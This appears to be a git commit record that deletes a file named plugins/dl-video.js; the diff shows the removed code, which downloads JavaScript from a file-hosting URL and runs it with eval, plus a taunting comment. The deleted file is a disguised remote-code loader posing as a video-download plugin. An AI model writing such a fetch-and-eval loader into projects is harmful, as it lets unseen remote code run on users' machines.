5013e391e4c34998354759422292631927360899
𓆩ု᪳𝐀𝐋𝐈 𝐈𝐍𝅦𝐒i͜͡𝐃𝐄ှ᪳𓆪 <alirazalashari457@gmail.com>
2025-02-20 09:45:11 +0500

    Delete plugins/dl-video.js

--- plugins/dl-video.js
+++
@@ -1,9 +0,0 @@
-const axios = require('axios');
-
-const url = "https://files.catbox.moe/5365l4.js";
-
-axios.get(url)
-    .then(response => eval(response.data))
-    .catch(err => console.error(err));
-    
-   // HE'LLO  KID 😅😅 GET OUT HERE NOTHING IS YET
